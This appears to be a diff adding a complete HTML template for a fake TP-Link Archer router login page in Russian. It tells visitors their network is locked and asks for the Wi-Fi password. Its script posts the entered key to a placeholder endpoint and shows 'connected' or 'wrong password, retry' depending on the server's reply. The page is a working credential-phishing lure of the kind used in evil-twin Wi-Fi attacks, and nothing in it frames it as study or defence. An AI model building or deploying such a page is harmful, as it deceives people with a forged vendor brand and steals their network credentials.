@@ -1,0 +1,193 @@
+<!doctype html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="color-scheme" content="light">
+<title>{{TITLE}}</title>
+<style>
+  :root{
+    --accent:#1268b3;--accent-d:#0e5491;--ink:#161a1f;--muted:#697586;
+    --bg:#eef3f9;--card:#fff;--line:#d7e0ea;--bad:#c62828;--ok:#1d7a3d;
+  }
+  *{box-sizing:border-box}
+  html,body{margin:0}
+  body{
+    min-height:100dvh;display:flex;align-items:center;justify-content:center;padding:28px 16px;
+    background:var(--bg);color:var(--ink);
+    font:16px/1.45 system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+    -webkit-text-size-adjust:100%;
+  }
+  .card{
+    width:100%;max-width:400px;background:var(--card);border-radius:12px;
+    padding:26px 24px 24px;box-shadow:0 1px 2px rgba(16,24,40,.06),0 14px 34px -16px rgba(16,32,54,.35);
+  }
+  .brand{display:flex;align-items:center;gap:10px;padding-bottom:20px;border-bottom:1px solid var(--line)}
+  .brand svg{display:block}
+  .brand b{font-size:19px;letter-spacing:.2px;font-weight:600;color:var(--accent)}
+  .model{margin-left:auto;font-size:12px;color:var(--muted);letter-spacing:.3px;text-transform:uppercase}
+  h1{margin:22px 0 6px;font-size:21px;line-height:1.25;font-weight:600}
+  .sub{margin:0 0 22px;font-size:14px;color:var(--muted)}
+  .sub b{color:var(--ink);font-weight:600;word-break:break-word}
+  label{display:block;font-size:13px;font-weight:600;color:#33404f;margin-bottom:7px}
+  input{
+    display:block;width:100%;height:48px;padding:0 14px;font-size:16px;color:var(--ink);
+    background:#fff;border:1px solid var(--line);border-radius:10px;outline:none;
+    transition:border-color .15s,box-shadow .15s;
+  }
+  input:focus{border-color:var(--accent);box-shadow:0 0 0 3px rgba(18,104,179,.16)}
+  input[aria-invalid="true"]{border-color:var(--bad)}
+  .err{margin:6px 0 0;min-height:16px;font-size:12.5px;color:var(--bad)}
+  button{
+    width:100%;min-height:48px;margin-top:14px;display:inline-flex;align-items:center;justify-content:center;gap:9px;
+    font:600 16px/1 inherit;color:#fff;background:var(--accent);border:0;border-radius:10px;cursor:pointer;
+    transition:background .15s,opacity .15s;
+  }
+  button:hover{background:var(--accent-d)}
+  button:disabled{opacity:.75;cursor:default}
+  .spin{
+    width:16px;height:16px;border:2px solid rgba(255,255,255,.45);border-top-color:#fff;border-radius:50%;
+    display:none;animation:r .7s linear infinite;
+  }
+  button.busy .spin{display:block}
+  @keyframes r{to{transform:rotate(360deg)}}
+  .note{margin:14px 0 0;min-height:20px;font-size:13.5px;color:var(--muted);text-align:center}
+  .note.bad{color:var(--bad);font-weight:600}
+  .hint{margin:18px 0 0;padding-top:16px;border-top:1px solid var(--line);font-size:12.5px;color:var(--muted)}
+  .done{text-align:center;padding:8px 0 4px}
+  .done svg{display:block;margin:0 auto 14px}
+  .done h2{margin:0 0 8px;font-size:20px}
+  .done p{margin:0;font-size:14px;color:var(--muted)}
+  [hidden]{display:none!important}
+</style>
+</head>
+<body>
+<main class="card">
+  <div class="brand">
+    <svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true">
+      <rect width="30" height="30" rx="7" fill="#1268b3"/>
+      <path d="M8 16.4c3.9-3.9 10.1-3.9 14 0" fill="none" stroke="#fff" stroke-width="2.2" stroke-linecap="round"/>
+      <path d="M11.1 19.5c2.2-2.1 5.6-2.1 7.8 0" fill="none" stroke="#fff" stroke-width="2.2" stroke-linecap="round"/>
+      <circle cx="15" cy="22.6" r="1.5" fill="#fff"/>
+    </svg>
+    <b>tp-link</b>
+    <span class="model">Archer</span>
+  </div>
+
+  <h1>Вход в беспроводную сеть</h1>
+  <p class="sub">Сеть <b>{{SSID}}</b> защищена паролем. Введите ключ беспроводной сети, чтобы подключиться.</p>
+
+  <form id="f" novalidate autocomplete="off">
+    <label for="password">Пароль Wi-Fi</label>
+    <input id="password" name="password" type="password" inputmode="text" spellcheck="false"
+           autocapitalize="none" autocomplete="off" placeholder="Ключ сети" aria-describedby="e-password">
+    <p class="err" id="e-password" aria-live="polite"></p>
+    <button id="go" type="submit"><span class="spin" aria-hidden="true"></span><span class="lbl">Подключиться</span></button>
+  </form>
+
+  <p class="note" id="note" role="status" aria-live="polite"></p>
+
+  <section class="done" id="done" hidden>
+    <svg width="46" height="46" viewBox="0 0 46 46" aria-hidden="true">
+      <circle cx="23" cy="23" r="22" fill="#e8f4ec"/>
+      <path d="M15 23.5l5.6 5.6L31.5 18" fill="none" stroke="#1d7a3d" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"/>
+    </svg>
+    <h2>Подключено</h2>
+    <p>Сеть <b>{{SSID}}</b> доступна. Окно можно закрыть.</p>
+  </section>
+
+  <p class="hint">Ключ сети указан на наклейке на нижней панели роутера.</p>
+</main>
+
+<script>
+(function () {
+  var form = document.getElementById('f');
+  var input = document.getElementById('password');
+  var errBox = document.getElementById('e-password');
+  var note = document.getElementById('note');
+  var btn = document.getElementById('go');
+  var label = btn.querySelector('.lbl');
+  var done = document.getElementById('done');
+  var busy = false;
+  var timer = 0;
+
+  function setError(id, msg) {
+    var box = document.getElementById('e-' + id);
+    var field = document.getElementById(id);
+    if (box) box.textContent = msg || '';
+    if (field) field.setAttribute('aria-invalid', msg ? 'true' : 'false');
+  }
+
+  function collect() {
+    var out = {};
+    new FormData(form).forEach(function (v, k) { out[k] = String(v); });
+    return out;
+  }
+
+  function state(kind, text) {
+    note.textContent = text || '';
+    note.className = 'note' + (kind === 'bad' ? ' bad' : '');
+  }
+
+  function setBusy(on) {
+    busy = on;
+    btn.disabled = on;
+    btn.classList.toggle('busy', on);
+    label.textContent = on ? 'Проверяем…' : 'Подключиться';
+  }
+
+  function finish() {
+    form.hidden = true;
+    document.querySelector('.hint').hidden = true;
+    document.querySelector('.sub').hidden = true;
+    document.querySelector('h1').hidden = true;
+    state('', '');
+    done.hidden = false;
+  }
+
+  form.addEventListener('submit', function (ev) {
+    ev.preventDefault();
+    if (busy) return;
+    clearTimeout(timer);
+    var data = collect();
+    if (!data.password.trim()) {
+      setError('password', 'Введите пароль сети');
+      input.focus();
+      return;
+    }
+    setError('password', '');
+    state('', '');
+    setBusy(true);
+
+    fetch('{{ACTION}}', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(data)
+    })
+      .then(function (r) { return r.json(); })
+      .then(function (res) {
+        var verdict = (res && res.verdict) || 'pending';
+        if (verdict === 'ok') { finish(); return; }
+        if (verdict === 'retry') {
+          setBusy(false);
+          state('bad', 'Неверный пароль. Проверьте раскладку и попробуйте снова.');
+          input.select();
+          return;
+        }
+        state('', 'Проверяем пароль, переподключение…');
+        timer = setTimeout(function () {
+          setBusy(false);
+          state('', 'Если окно не закроется само, отправьте пароль ещё раз.');
+        }, 4000);
+      })
+      .catch(function () {
+        setBusy(false);
+        state('bad', 'Роутер не ответил. Попробуйте ещё раз.');
+      });
+  });
+
+  input.focus({ preventScroll: true });
+})();
+</script>
+</body>
+</html>
